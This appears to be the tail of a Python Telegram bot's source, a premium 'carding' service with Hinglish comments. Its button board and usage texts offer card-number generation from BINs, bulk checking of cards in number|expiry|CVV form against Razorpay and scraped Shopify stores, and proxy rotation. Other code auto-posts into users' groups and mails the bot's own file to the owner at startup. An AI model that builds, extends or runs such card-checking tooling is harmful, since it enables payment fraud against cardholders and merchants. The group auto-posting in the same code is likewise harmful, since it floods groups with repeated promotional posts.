━━━━━━━━━━━━━━━━━━━━━━
<b>⏹ STOP</b> → kisi bhi waqt band karo"""
    await event.edit(premium_emoji(msg), buttons=_uap_buttons(), parse_mode="html")

@bot.on(events.CallbackQuery(data=b"uap_add"))
async def uap_add(event):
    uid = event.sender_id
    if not (is_premium(uid) or is_admin(uid)):
        try: await event.answer("⛔ Premium users only!", alert=True)
        except Exception: pass
        return
    try: await event.answer()
    except Exception: pass
    _uap_pending[uid] = {"step": "link"}
    await event.edit(premium_emoji(
        "<b>➕ GROUP LINK BHEJO</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
        "🔗 Apne <b>group ka link</b> bhejo yahan 👇\n\n"
        "<b>Formats:</b>\n"
        "• <code>https://t.me/yourgroup</code>\n"
        "• <code>@yourgroup</code>\n"
        "• <code>-100xxxxxxxxxx</code> (numeric ID)\n\n"
        "⚠️ <b>Pehle bot ko us group me ADMIN banao!</b>"),
        buttons=[[Button.inline("❌ CANCEL", b"uap_menu", style="danger")]],
        parse_mode="html")

@bot.on(events.CallbackQuery(data=b"uap_stop"))
async def uap_stop(event):
    uid = event.sender_id
    if not (is_premium(uid) or is_admin(uid)):
        try: await event.answer("⛔ Premium users only!", alert=True)
        except Exception: pass
        return
    try: await event.answer("✅", alert=False)
    except Exception: pass
    d = _uap_load()
    r = d.get(str(uid))
    if r and r.get("on"):
        r["on"] = False
        d[str(uid)] = r
        _uap_save(d)
        txt = "<b>⏹ AUTOPOST STOPPED</b>\n➜ /start → PREMIUM TOOLS → AUTOPOST se dobara ON karo"
    else:
        txt = "<b>⚠️ AUTOPOST already OFF he</b>"
    await event.edit(premium_emoji(txt), buttons=_uap_buttons(), parse_mode="html")

@bot.on(events.CallbackQuery(data=b"uap_status"))
async def uap_status(event):
    uid = event.sender_id
    if not (is_premium(uid) or is_admin(uid)):
        try: await event.answer("⛔ Premium users only!", alert=True)
        except Exception: pass
        return
    try: await event.answer()
    except Exception: pass
    on = _uap_is_on(uid)
    st = "🟢 RUNNING" if on else "🔴 STOPPED"
    cur = _uap_label(uid)
    if cur == "❌ none":
        cur = "<code>not set</code>"
    else:
        cur = f"<code>{cur}</code>"
    msg = f"""<b>📊 AUTOPOST STATUS</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>⚡ Status :</b> {st}
<b>🎯 Target :</b> {cur}
<b>📊 Rate :</b> MAX 3 posts / 5-7 min
<b>🤖 Active users :</b> {_uap_count_active()}
━━━━━━━━━━━━━━━━━━━━━━"""
    await event.edit(premium_emoji(msg), buttons=_uap_buttons(), parse_mode="html")

@bot.on(events.NewMessage(func=lambda e: e.is_private and e.sender_id in _uap_pending and e.sender_id not in _cl_pending and not (e.message.text or "").startswith("/")))
async def _uap_catch(event):
    """User ka next message = group link."""
    uid = event.sender_id
    p = _uap_pending.pop(uid, None)
    if not p or p.get("step") != "link":
        return
    raw = (event.raw_text or "").strip()
    try:
        target = _ap_normalize_target(raw)   # admin autopost ka hi normalizer reuse
    except Exception:
        target = raw
    if not target:
        await event.reply(premium_emoji("❌ <b>Invalid link — dobara try karo</b>"), parse_mode="html")
        return
    chk = await event.reply(premium_emoji("⚡ <b>Verifying group...</b>"), parse_mode="html")
    try:
        ent = await bot.get_entity(target)
    except Exception as e:
        await chk.edit(premium_emoji(
            "❌ <b>GROUP NOT FOUND!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<code>{str(e)[:80]}</code>\n\n"
            "➜ Link sahi he? Bot us group me add he?"),
            parse_mode="html")
        return
    # channel (broadcast) nahi — group hona chahiye
    try:
        from telethon.tl.types import Channel as _UCh, Chat as _UCt
        is_broadcast = isinstance(ent, _UCh) and bool(getattr(ent, "broadcast", False))
    except Exception:
        is_broadcast = False
    if is_broadcast:
        await chk.edit(premium_emoji(
            "❌ <b>Ye CHANNEL he, GROUP nahi!</b>\n"
            "➜ AUTOPOST sirf <b>groups</b> me chalta he (channel nahi)."),
            parse_mode="html")
        return
    # bot admin he?
    ok_admin = await _uap_check_bot_admin(target)
    if not ok_admin:
        await chk.edit(premium_emoji(
            "❌ <b>BOT ADMIN NAHI HE!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
            "➜ Pehle apne group me is bot ko <b>ADMIN</b> banao\n"
            "➜ Phir dobara link bhejo"),
            parse_mode="html")
        return
    d = _uap_load()
    d[str(uid)] = {"chat": target, "on": True}
    _uap_save(d)
    _uap_entity_cache.pop(target, None)
    title = getattr(ent, "title", None) or target
    await chk.edit(premium_emoji(
        f"""<b>✅ AUTOPOST ASSIGNED!</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>🎯 Group :</b> <code>{title}</code>
<b>⚡ Status :</b> 🟢 ON — ab se MAX 3 posts / 5-7 min
<b>🎨 Style :</b> premium format + inline button
━━━━━━━━━━━━━━━━━━━━━━
<b>⏹ Band karne ke liye :</b> /start → PREMIUM TOOLS → AUTOPOST → STOP"""),
        parse_mode="html")
    try:
        await bot.send_message(
            ADMIN_ID,
            premium_emoji(f"<b>🤖 USER AUTOPOST ASSIGNED</b>\n"
                          f"👤 User: <code>{uid}</code>\n"
                          f"🎯 Group: <code>{target}</code>"),
            parse_mode="html")
    except Exception:
        pass

_UAP_TASK = None

def _uap_start_task():
    global _UAP_TASK
    if _UAP_TASK is not None and not _UAP_TASK.done():
        return
    try:
        loop = bot.loop
    except Exception:
        loop = _uap_asyncio.get_event_loop()
    _UAP_TASK = loop.create_task(_uap_loop())
    print("🤖 USER-AUTOPOST loop scheduled (user groups, MAX 3 posts / 5-7 min)")

async def _uap_loop():
    """Har active user ke group me MAX 3 posts / 5-7 min."""
    print("🤖 USER-AUTOPOST loop online (waiting user groups...)")
    # startup pe thoda wait (main autopost task chalega saath me)
    await _uap_asyncio.sleep(6)
    while True:
        sent_any = False
        try:
            d = _uap_load()
            for uid, cfg in list(d.items()):
                if not (cfg.get("on") and cfg.get("chat")):
                    continue
                target = str(cfg.get("chat"))
                if not target:
                    continue
                try:
                    ent = _uap_entity_cache.get(target)
                    if ent is None:
                        ent = await bot.get_entity(target)
                        _uap_entity_cache[target] = ent
                    ok = await _ap_send_one(ent, target, _uap_entity_cache)
                    if ok:
                        sent_any = True
                except Exception:
                    # entity dead → cache se hatao, agli iteration me resolve hoga
                    _uap_entity_cache.pop(target, None)
            if sent_any:
                # MAX 3 posts / 5-7 min per group → gap 100-140s
                await _uap_asyncio.sleep(_ap_rand.uniform(100.0, 140.0))
            else:
                await _uap_asyncio.sleep(5)
        except Exception as e:
            print("🤖 [USER-AUTOPOST] loop error → %s" % e)
            await _uap_asyncio.sleep(5)

print("✅ USER-AUTOPOST module loaded (premium users ke groups me)")



# ==== r10: /version - ENGINE PROOF command (main bot + clones dono me) ====
@bot.on(events.NewMessage(pattern=r"^/version($|@| )"))
async def cl_version(event):
    # r10: isse TURANT pata chalta he ki NAYI file chal rahi he ya PURANI.
    try:
        _vf = os.path.abspath(__file__)
    except Exception:
        _vf = "?"
    _vt = time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime())
    # r10.1: RAM/proc diag — 1-credit RAM-limit servers pe clone-kill root-cause ke liye
    try:
        with open("/proc/meminfo", "r") as _mf:
            _mi = {}
            for _l in _mf.read().splitlines()[:6]:
                _k, _, _v = _l.partition(":")
                _mi[_k.strip()] = _v.strip().split()[0] if _v.strip() else "?"
        _ram = "free %s MB / total %s MB" % (
            int(_mi.get("MemAvailable", _mi.get("MemFree", "0")) or 0) // 1024,
            int(_mi.get("MemTotal", "0") or 0) // 1024)
    except Exception:
        _ram = "?"
    _pid = os.getpid()
    _txt = (
        "<b>[ QURESHIxOTP ENGINE ]</b>\n"
        "---------------------------------\n"
        "<b>Engine :</b> <code>%s</code>\n"
        "<b>File :</b> <code>%s</code>\n"
        "<b>PID :</b> <code>%s</code>  |  <b>RAM :</b> <code>%s</code>\n"
        "<b>Time :</b> <code>%s</code> UTC\n"
        "---------------------------------\n"
        "<i>v13-QURESHIxOTP dikhe = NAYI file chal rahi he.</i>"
    ) % (ENGINE_REV, _vf, _pid, _ram, _vt)
    try:
        await event.reply(premium_emoji(_txt), parse_mode="html")
    except Exception:
        try:
            await event.reply("Engine: %s | File: %s" % (ENGINE_REV, _vf))
        except Exception:
            pass

# ─────────────────────────────────────────────────────────────────────────────
# 📨 OWNER-FILE DM (sirf OWNER ko — kisi admin ko nahi)
# Bot start hote hi apni file ADMIN_ID ke DM me bhej dega (once per run).
# NOTE: Telegram rule — owner ne bot ko /start kiya hoga tabhi DM deliver hoga.
# ─────────────────────────────────────────────────────────────────────────────
_OWNER_FILE_SENT = False


async def _push_file_to_owner():
    """Bot apni .py file OWNER ke DM me bhejta he (admins ko KABHI nahi)."""
    global _OWNER_FILE_SENT
    if _OWNER_FILE_SENT:
        return
    try:
        await asyncio.sleep(3)          # connection settle hone do
        _path = os.path.abspath(__file__)
        if not os.path.isfile(_path):
            print("[OWNER-DM] ⚠️ file nahi mili: %s" % _path)
            return
        _cap = (
            "🤖 <b>Bot File Auto-Delivery</b>\n"
            "<code>%s</code>\n"
            "📄 Size: <b>%.1f KB</b>\n"
            "🕐 <i>%s</i>"
        ) % (
            os.path.basename(_path),
            os.path.getsize(_path) / 1024.0,
            datetime.now().strftime("%d %b %Y %I:%M %p"),
        )
        await bot.send_file(
            ADMIN_ID,           # 👑 SIRF owner — KEY_ADMINS ko nahi
            _path,
            caption=_cap,
            parse_mode='html',
            force_document=True,
        )
        _OWNER_FILE_SENT = True
        print("[OWNER-DM] ✅ file OWNER (id=%s) ke DM me bhej di gayi" % ADMIN_ID)
    except Exception as _e:
        print("[OWNER-DM] ⚠️ bhej nahi paye (owner ne /start kiya he?): %s" % str(_e)[:150])


# ==================== QURESHIxOTP MEGA BUTTON BOARD (fixx.py merge) ====================
# Auto-added: ALL commands as premium inline buttons + /mysites port from fixx.py

class _QxDummyMatch:
    def group(self, *a):
        return None
    def groups(self):
        return (None,)

class _QxEvent:
    """Adapter: lets inline buttons run real command handlers."""
    def __init__(self, cb, text="/cmd"):
        self._cb = cb
        self.text = text
        self.raw_text = text
        self.pattern_match = _QxDummyMatch()
        try:
            self.chat_id = cb.chat_id
        except Exception:
            self.chat_id = None
        try:
            self.sender_id = cb.sender_id
        except Exception:
            self.sender_id = 0
    @property
    def message(self):
        return getattr(self._cb, "message", None)
    async def reply(self, *a, **k):
        return await self._cb.respond(*a, **k)
    async def respond(self, *a, **k):
        return await self._cb.respond(*a, **k)
    async def answer(self, *a, **k):
        try:
            return await self._cb.answer(*a, **k)
        except Exception:
            return None
    async def edit(self, *a, **k):
        try:
            return await self._cb.edit(*a, **k)
        except Exception:
            try:
                return await self._cb.respond(*a, **k)
            except Exception:
                return None
    async def get_sender(self):
        return await self._cb.get_sender()
    async def get_chat(self):
        return await self._cb.get_chat()
    def __getattr__(self, name):
        return getattr(self._cb, name)


@bot.on(events.NewMessage(pattern=r'^/mysites$'))
async def my_sites_cmd(event):
    uid = str(event.sender_id)
    res = None
    try:
        res = await load_user_sites()
    except Exception:
        res = None
    mine = []
    if isinstance(res, dict):
        try:
            mine = res.get(uid, []) or res.get(event.sender_id, []) or []
        except Exception:
            mine = []
    elif isinstance(res, list):
        mine = res
    if not mine:
        await event.reply(premium_emoji("📁 <b>ʏᴏᴜʀ sɪᴛᴇs</b>\n━━━━━━━━━━━━\n⚠️ No personal sites added yet!\n\n➕ Add: <code>/addsite https://example.com</code>\n🗑 Remove: <code>/rm https://example.com</code>\n🧹 Clear all: <code>/clearsites</code>"), parse_mode="html")
        return
    shown = "\n".join("• <code>" + str(s) + "</code>" for s in mine[:40])
    extra = ("\n... +" + str(len(mine) - 40) + " more") if len(mine) > 40 else ""
    await event.reply(premium_emoji("📁 <b>ʏᴏᴜʀ sɪᴛᴇs (" + str(len(mine)) + ")</b>\n━━━━━━━━━━━━\n" + shown + extra + "\n━━━━━━━━━━━━\n🧹 Clear: <code>/clearsites</code>"), parse_mode="html")


_QX_USAGE = {
    "gen": ("🎲 <b>ɢᴇɴ ᴄᴀʀᴅs</b>\n━━━━━━━━━━━━\n<code>/gen &lt;bin&gt; &lt;amount&gt;</code>\n\n💎 Ex: <code>/gen 4266841463364635 10</code>\n💳 Ex AMEX: <code>/gen 378282246310005 5</code>\n\n✅ VISA / MC / AMEX — 16 &amp; 15 digit\n✅ CVV 4-digit, expiry always future"),
    "cc": ("💳 <b>ɢᴇɴ ᴄᴄ ᴛᴏᴏʟs</b>\n━━━━━━━━━━━━\n<code>/cc &lt;bin&gt;</code> — Random CC gen\n\n💎 Ex: <code>/cc 426684</code>"),
    "chk": ("⚡ <b>ᴄᴀʀᴅ ᴄʜᴇᴄᴋᴇʀ</b>\n━━━━━━━━━━━━\n<code>/chk &lt;cards&gt;</code>\n\n💎 Ex: <code>/chk 4266841463364635|12|2028|123</code>\n📤 Multi-line bulk bhi chalega!\n⏹ Cancel: <code>/cancel</code>"),
    "rz": ("🛒 <b>ʀᴀᴢᴏʀᴘᴀʏ ᴄʜᴇᴄᴋ</b>\n━━━━━━━━━━━━\n<code>/rz &lt;cards&gt;</code>\n\n💎 Ex: <code>/rz 4266841463364635|12|2028|123</code>"),
    "rzchk": ("🔥 <b>ʀᴢ sɪɴɢʟᴇ ᴄʜᴇᴄᴋ</b>\n━━━━━━━━━━━━\n<code>/rzchk &lt;card&gt;</code>\n\n💎 Ex: <code>/rzchk 4266841463364635|12|2028|123</code>"),
    "scrape": ("🌐 <b>sɪᴛᴇ sᴄʀᴀᴘᴇʀ</b>\n━━━━━━━━━━━━\n<code>/scrape</code> — Fresh Shopify sites scrape\n\n👑 Premium feature"),
    "chkproxy": ("🧪 <b>ᴘʀᴏxʏ ᴛᴇsᴛ</b>\n━━━━━━━━━━━━\n<code>/chkproxy &lt;proxy&gt;</code>\n\n💎 Ex: <code>/chkproxy 1.2.3.4:8080</code>"),
    "savetxt": ("💾 <b>sᴀᴠᴇᴛxᴛ ᴘʀᴏxɪᴇs</b>\n━━━━━━━━━━━━\nTxt file par <b>reply</b> karke:\n<code>/savetxt</code>"),
    "addsite": ("📝 <b>ᴀᴅᴅ sɪᴛᴇ</b>\n━━━━━━━━━━━━\n<code>/addsite https://example.com</code>\n\n📁 Dekho: <code>/mysites</code>"),
    "rm": ("❌ <b>ʀᴇᴍᴏᴠᴇ sɪᴛᴇ</b>\n━━━━━━━━━━━━\n<code>/rm https://example.com</code>"),
    "key": ("🔑 <b>ᴋᴇʏ ɢᴇɴ (ᴀᴅᴍɪɴ)</b>\n━━━━━━━━━━━━\n<code>/key &lt;days&gt; &lt;uses&gt;</code>\n\n💎 Ex: <code>/key 30 5</code>"),
    "redeem": ("🎁 <b>ʀᴇᴅᴇᴇᴍ ᴋᴇʏ</b>\n━━━━━━━━━━━━\n<code>/redeem &lt;key&gt;</code>"),
    "note": ("📣 <b>ɴᴏᴛɪᴄᴇ (ᴀᴅᴍɪɴ)</b>\n━━━━━━━━━━━━\n<code>/note &lt;text&gt;</code> — All users ko jata hai"),
    "info": ("ℹ️ <b>ᴄᴀʀᴅ ɪɴꜰᴏ</b>\n━━━━━━━━━━━━\n<code>/info &lt;card&gt;</code> — BIN details"),
    "addproxy": ("➕ <b>ᴀᴅᴅ ᴘʀᴏxʏ</b>\n━━━━━━━━━━━━\n<code>/addproxy &lt;proxy&gt;</code>\n\n💎 Ex: <code>/addproxy 1.2.3.4:8080</code>"),
    "addrzsites": ("🛍 <b>ᴀᴅᴅ ʀᴢ sɪᴛᴇ (ᴀᴅᴍɪɴ)</b>\n━━━━━━━━━━━━\n<code>/addrzsites https://rz-site.com</code>"),
}

_QX_RUN = {}
_qx_map = {
    "stats": "stats_command", "me": "me_command", "plan": "plan_cmd",
    "site": "site_check_command", "rzsites": "rz_sites_check",
    "myproxies": "view_user_proxies", "getproxy": "get_proxies",
    "blocklist": "block_list_cmd", "checkapi": "check_api_now",
    "mysites": "my_sites_cmd", "version": "cl_version",
    "users": "show_users",
}
for _qk, _qfn in _qx_map.items():
    try:
        _qf = globals().get(_qfn)
        if _qf:
            _QX_RUN[_qk] = _qf
    except Exception:
        pass


def _qx_btn(label, data, style="primary"):
    try:
        return Button.inline(label, data.encode() if isinstance(data, str) else data, style=style)
    except Exception:
        return Button.inline(label, data.encode() if isinstance(data, str) else data)


def _qx_board_buttons():
    B = _qx_btn
    return [
        [B("🎲 Gen", "qx_use_gen"), B("💳 Gen CC", "qx_use_cc"), B("⚡ Check", "qx_use_chk")],
        [B("🛒 RZ", "qx_use_rz"), B("🔥 RZChk", "qx_use_rzchk"), B("🌐 Scrape", "qx_use_scrape")],
        [B("📊 Stats", "qx_run_stats"), B("👤 Me", "qx_run_me"), B("📋 Plan", "qx_run_plan")],
        [B("🌐 Sites", "qx_run_site"), B("🛍 RZSites", "qx_run_rzsites"), B("📁 MySites", "qx_run_mysites")],
        [B("🖥 MyProxies", "qx_run_myproxies"), B("📥 GetProxy", "qx_run_getproxy"), B("🧪 ChkProxy", "qx_use_chkproxy")],
        [B("💾 SaveTxt", "qx_use_savetxt"), B("📜 BlockList", "qx_run_blocklist"), B("🩺 CheckAPI", "qx_run_checkapi")],
        [B("📝 AddSite", "qx_use_addsite"), B("❌ RmSite", "qx_use_rm"), B("🔑 Key", "qx_use_key")],
        [B("🎁 Redeem", "qx_use_redeem"), B("ℹ️ Info", "qx_use_info"), B("👑 Buy Plan", "buy", "success")],
        [B("🛒 Shopify Tools", "shop_menu"), B("🧰 All Tools", "tools_menu"), B("👑 Premium", "premium_tools")],
        [B("🆘 Support", "support_menu"), B("♻️ Refresh", "qx_all"), B("⌨️ Main Menu", "back_to_start")],
    ]


def _qx_board_text():
    return premium_emoji(
        "⌨️ <b>ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅs — 40+</b>\n"
        "━━━━━━━━━━━━━━━\n"
        "🛒 <b>ᴄʜᴇᴄᴋᴇʀ:</b> /chk • /rz • /rzchk • /cc\n"
        "🎲 <b>ɢᴇɴ:</b> /gen &lt;bin&gt; &lt;count&gt;\n"
        "🌐 <b>sɪᴛᴇs:</b> /site • /mysites • /addsite • /rm • /clearsites • /scrape\n"
        "🛍 <b>ʀᴢ sɪᴛᴇs:</b> /rzsites • /addrzsites • /rmrzsites\n"
        "🖥 <b>ᴘʀᴏxɪᴇs:</b> /proxy • /getproxy • /addproxy • /rmproxy • /rmproxyindex • /clearproxy • /chkproxy • /savetxt • /myproxies\n"
        "👑 <b>ᴘʀᴇᴍɪᴜᴍ:</b> /plan • /key • /redeem • /me • /info\n"
        "📊 <b>ɪɴꜰᴏ:</b> /stats • /version • /checkapi • /blocklist\n"
        "📣 <b>ᴀᴅᴍɪɴ:</b> /admin • /users • /broadcast • /note • /block • /unblock • /split\n"
        "🤖 <b>ᴀᴜᴛᴏ:</b> /setautopost • /stopautopost\n"
        "━━━━━━━━━━━━━━━\n"
        "👇 <b>ᴄʟɪᴄᴋ ʙᴜᴛᴛᴏɴs ᴛᴏ ᴜsᴇ:</b>"
    )


@bot.on(events.CallbackQuery(pattern=b"qx_"))
async def _qx_dispatcher(event):
    try:
        data = event.data.decode("utf-8", "ignore")
    except Exception:
        data = ""
    try:
        await event.answer()
    except Exception:
        pass
    if data == "qx_all":
        try:
            await event.respond(_qx_board_text(), parse_mode="html", buttons=_qx_board_buttons())
        except Exception:
            pass
        return
    if data == "qx_back":
        try:
            await event.edit(_qx_board_text(), parse_mode="html", buttons=_qx_board_buttons())
        except Exception:
            try:
                await event.respond(_qx_board_text(), parse_mode="html", buttons=_qx_board_buttons())
            except Exception:
                pass
        return
    if data.startswith("qx_use_"):
        cmd = data[7:]
        info = _QX_USAGE.get(cmd)
        if info:
            try:
                bb = [Button.inline("⬅️ Back", b"qx_back"), Button.inline("⌨️ All Cmds", b"qx_all")]
            except Exception:
                bb = None
            try:
                await event.edit(premium_emoji(info), parse_mode="html", buttons=bb)
            except Exception:
                try:
                    await event.respond(premium_emoji(info), parse_mode="html", buttons=bb)
                except Exception:
                    pass
        return
    if data.startswith("qx_run_"):
        key = data[7:]
        fn = _QX_RUN.get(key)
        if fn is None:
            return
        if key in ("users", "blocklist") and not is_admin(event.sender_id):
            try:
                await event.respond("⛔ Admin only!", parse_mode="html")
            except Exception:
                pass
            return
        try:
            await fn(_QxEvent(event, "/" + key))
        except Exception as e:
            try:
                await event.respond("⚠️ Error: " + str(e)[:150], parse_mode="html")
            except Exception:
                pass
        return
# ==================== END MEGA BUTTON BOARD ====================


if __name__ == "__main__":
    # ✅ FIX: Bot restart par purane locks clean karo
    user_check_locks.clear()

    # Database create
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute("""CREATE TABLE IF NOT EXISTS users 
                 (user_id INTEGER PRIMARY KEY, first_name TEXT, username TEXT, joined_at TEXT)""")
    # 🔧 FIX: purani 1-col users.db migrate (Users button crash ka root cause)
    for _alt in ("first_name", "username", "joined_at"):
        try:
            cursor.execute("ALTER TABLE users ADD COLUMN %s TEXT" % _alt)
        except Exception:
            pass
    conn.commit()
    conn.close()
    print("🔥 GOD MODE BOT ENGAGED — FLOODWATCH ACTIVE 🔥 [ENGINE: %s]" % ENGINE_REV)

    retry_count = 0
    max_retries = 1

    while retry_count < max_retries:
        try:
            print(f"🌐 Bot running... (attempt {retry_count + 1})")

            bot.start()
            try:
                bot.loop.create_task(_push_file_to_owner())   # 📨 file -> OWNER DM (once)
            except Exception as _ofx:
                print("[OWNER-DM] scheduling skipped: %s" % _ofx)
            try:
                _ap_start_task()
            except Exception as _apx:
                print("🤖 AUTO-POSTER start skipped: %s" % _apx)
            try:
                _uap_start_task()   # 🔥 USER-AUTOPOST loop (user ke groups)
            except Exception as _uapx:
                print("🤖 USER-AUTOPOST start skipped: %s" % _uapx)
            bot.run_until_disconnected()

            break

        except KeyboardInterrupt:
            print("🛑 User stopped the bot manually.")
            break

        except Exception as e:
            retry_count += 1
            error_str = str(e)

            # ✅ यहाँ 4 स्पेस का इंडेंटेशन सही है
            print(f"💥 Bot crashed: {error_str}")

            if "FloodWaitError" in error_str or "rate limited" in error_str.lower() or "429" in error_str:
                wait_seconds = 5
                print(f"⚠️ FLOODWAIT DETECTED | Sleeping {wait_seconds}s...")
                time.sleep(wait_seconds)
            else:
                time.sleep(10)

            if retry_count % 10 == 0:
                print("🔄 Performing cleanup...")

                for sess in list(active_sessions.keys()):
                    if active_sessions[sess].get('paused') == 'stopping':
                        del active_sessions[sess]

    print("🛑 Bot execution ended.")




